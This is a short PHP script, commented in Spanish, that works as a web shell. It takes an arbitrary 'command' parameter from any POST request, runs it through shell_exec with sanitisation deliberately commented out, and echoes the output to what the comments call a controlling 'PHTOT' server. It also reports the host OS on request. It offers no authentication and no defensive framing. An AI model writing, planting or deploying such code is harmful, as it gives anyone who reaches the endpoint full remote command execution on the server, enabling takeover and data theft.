<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_REQUEST['os'])) {
        $os = PHP_OS;
        return $os;    
    }else{
        // Obtener el comando enviado por el servidor HOLA
        $command = $_REQUEST['command'];

        // Sanitizar el comando para evitar riesgos (opcional, para pruebas no es necesario)
        // $command = escapeshellcmd($command);

        // Ejecutar el comando y capturar la salida
        $output = shell_exec($command);

        // Devolver la respuesta al servidor PHTOT
        echo $output;
    }
} else {
    echo "Método no permitido.";
}
?>
